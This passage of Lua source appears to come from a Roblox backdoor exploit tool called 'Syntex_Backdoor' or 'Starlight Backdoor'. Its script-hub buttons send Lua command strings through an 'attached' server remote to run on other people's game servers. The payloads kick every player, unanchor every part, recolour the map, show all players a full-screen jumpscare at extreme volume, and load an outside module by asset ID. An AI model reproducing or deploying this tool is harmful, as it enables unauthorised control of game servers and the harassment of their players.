			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_b8);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedMessage.LocalScript
local function C_bc()
	local script = G2L["bc"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text

		local command = [[
		      local function write(text,object)
			if object:IsA("Message") == true then
				local count = object:FindFirstChild("Count")
				if count == nil then
					count = Instance.new("NumberValue")
					count.Parent = object
					count.Name = "Count"
					count.Value = count.Value + 1
				else
					count.Value = count.Value + 1
				end
				local startcount = count.Value
				for i = 1,#text do
					if count.Value == startcount then
						local letter = string.sub(text,i,i)
						object.Text = string.sub(text,1,i)
						wait(0.001)
					else
						break
					end
				end
			end
		end
		local broM = Instance.new("Message",workspace)
		write("]] .. txt .. [[",broM)
		wait(6)
		broM:Destroy()
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_bc);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.JohnDoe.LocalScript
local function C_c0()
	local script = G2L["c0"];
	script.Parent.MouseButton1Click:Connect(function()
		local command = [[
	        require(2845929020).ooga("]] .. game.Players.LocalPlayer.Name .. [[")
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_c0);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Jumpscare.LocalScript
local function C_c4()
	local script = G2L["c4"];
	script.Parent.MouseButton1Click:Connect(function()
		local ID = tostring(script.Parent.Parent.Parent.ID.Text)

		local command = [[
		    for i,v in pairs(game.Players:GetPlayers()) do
			if v.Name ~= k and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
				spawn(function()
					local gui = Instance.new("ScreenGui",v.PlayerGui)
					local funny = Instance.new("ImageLabel",gui)
					funny.Image = "rbxassetid://]] .. ID .. [["
					funny.Size = UDim2.new(1,0,1,0)
					funny.ImageColor3 = Color3.new(255, 255, 255)
					local s = Instance.new("Sound",gui)
					s.SoundId = "rbxassetid://0"
					s.Volume = 99999999999999999
					s.Pitch = 1
					s:Play()
					local yes = Instance.new("DistortionSoundEffect",s)
					yes.Level = 0.5
					yes.Priority = 0
					wait(4)
					gui:Destroy()
				end)
			end
		end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_c4);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.RandomC.LocalScript
local function C_c8()
	local script = G2L["c8"];
	script.Parent.MouseButton1Click:Connect(function()
		local command = [[
		      for i,fee in pairs(workspace:GetDescendants()) do
			    if fee:IsA("BasePart") then
				   fee.BrickColor = BrickColor.random()
			    end
		      end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_c8);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Shutdown.LocalScript
local function C_cc()
	local script = G2L["cc"];
	script.Parent.MouseButton1Click:Connect(function()
		local txt = script.Parent.Parent.Parent.txt.Text

		local command = [[
	    for i,v in pairs(game.Players:GetPlayers()) do
			v:Kick("]] .. txt .. [[")
		end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
			greenBar.Position = UDim2.new(0, 0, 1, -4)
			greenBar.BorderSizePixel = 0

			local uigrd = Instance.new("UIGradient", mainFrame)
			uigrd.Rotation = 132
			uigrd.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 27, 255)),
				ColorSequenceKeypoint.new(0.515, Color3.fromRGB(49, 49, 49)),
				ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 248, 0))
			}

			local greenBarUICorner = Instance.new("UICorner")
			greenBarUICorner.Parent = greenBar
			uicrn.CornerRadius = UDim.new(0, 5)

			local slideIn = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.7, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
				{Position = UDim2.new(1, -20, 1, offset)}
			)

			slideIn:Play()

			local greenBarTween = TweenService:Create(
				greenBar,
				TweenInfo.new(2, Enum.EasingStyle.Linear),
				{Size = UDim2.new(0, 0, 0, 5)}
			)
			greenBarTween:Play()

			greenBarTween.Completed:Wait()

			local slideOut = TweenService:Create(
				mainFrame,
				TweenInfo.new(0.4, Enum.EasingStyle.Quad),
				{Position = UDim2.new(1, 300, 1, offset)}
			)
			slideOut:Play()

			slideOut.Completed:Wait()
			gui:SetAttribute("Active", false)
			gui:Destroy()
		end

		local pathString = script.Parent.Parent.Parent.Parent.Parent.Parent.mainScripts.remotePath.Value
		local current = game
		for part in string.gmatch(pathString, "[^.]+") do
			current = current:FindFirstChild(part)
			if not current then
				warn("Path not found:", part)
				return
			end
		end

		if current == game then
			Notification("Error", "Please attach before using script hub.")
		else
			current:FireServer(command)
			Notification("Success", script.Parent.Name.." executed.")
		end
	end)
end;
task.spawn(C_cc);
-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.UnAnchor.LocalScript
local function C_d0()
	local script = G2L["d0"];
	script.Parent.MouseButton1Click:Connect(function()
		local command = [[
		for i,v in pairs(game.Workspace:GetDescendants()) do
			if v:IsA("BasePart") then	
				v.Anchored = false
			end
		end
	
	
		for i,v in pairs(game.ReplicatedStorage:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
	
	
		for i,v in pairs(game.ReplicatedFirst:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Anchored = false
			end
		end
	    ]]

		local function Notification(notificationType, messageText)
			local function getNotificationType(nType)
				if nType == "Success" then
					return Color3.new(0, 1, 0)
				elseif nType == "Error" then
					return Color3.new(1, 0, 0)
				elseif nType == "Custom" then
					return Color3.new(0.976471, 0.733333, 0)
				end
			end
			local player = game:GetService("Players").LocalPlayer
			local TweenService = game:GetService("TweenService")
			local uicrn = Instance.new("UICorner")
			local container = player.PlayerGui:FindFirstChild("NotificationContainer")
			if not container then
				container = Instance.new("Frame")
				container.Name = "NotificationContainer"
				container.Parent = player.PlayerGui
				container.Size = UDim2.new(1, 0, 1, 0)
				container.BackgroundTransparency = 1
				container.Position = UDim2.new(0, 0, 0, 0)
			end
			task.wait(0.05)

			local function Checkframes()
				local count = 0
				for _, gui in ipairs(container:GetChildren()) do
					if gui:IsA("ScreenGui") and gui:GetAttribute("Active") then
						count += 1
					end
				end
				return count
			end
			local existing = Checkframes()

			local gui = Instance.new("ScreenGui")
			gui.Name = "SimpleNotify"
			gui.ResetOnSpawn = false
			gui.Parent = container
			gui:SetAttribute("Active", true) 

			local mainFrame = Instance.new("Frame")
			mainFrame.Name = "MainFrame"
			mainFrame.Parent = gui
			mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
			mainFrame.BackgroundTransparency = 0.15
			uicrn.Parent = mainFrame
			local offset = -80 - ((existing - 1) * 70) 
			mainFrame.Position = UDim2.new(1, 0, 1, offset)
			mainFrame.Size = UDim2.new(0, 260, 0, 60) 
			mainFrame.AnchorPoint = Vector2.new(1, 1) 

			local title = Instance.new("TextLabel")
			title.Name = "Title"
			title.Parent = mainFrame
			title.BackgroundTransparency = 1
			title.Position = UDim2.new(0, 12, 0, 8)
			title.Size = UDim2.new(1, -24, 0, 24)
			title.Font = Enum.Font.GothamBold
			title.Text = "Starlight Backdoor"
			title.TextColor3 = Color3.new(1, 1, 1)
			title.TextSize = 16
			title.TextXAlignment = Enum.TextXAlignment.Left

			local message = Instance.new("TextLabel")
			message.Name = "Message"
			message.Parent = mainFrame
			message.BackgroundTransparency = 1
			message.Position = UDim2.new(0, 12, 0, 32)
			message.Size = UDim2.new(1, -24, 0, 20)
			message.Font = Enum.Font.Gotham
			message.Text = messageText
			message.TextColor3 = Color3.new(0.8, 0.8, 0.8)
			message.TextSize = 14
			message.TextXAlignment = Enum.TextXAlignment.Left

			local greenBar = Instance.new("Frame")
			greenBar.Name = "GreenBar"
			greenBar.Parent = mainFrame
			greenBar.BackgroundColor3 = getNotificationType(notificationType)
			greenBar.Size = UDim2.new(1, 0, 0, 5)
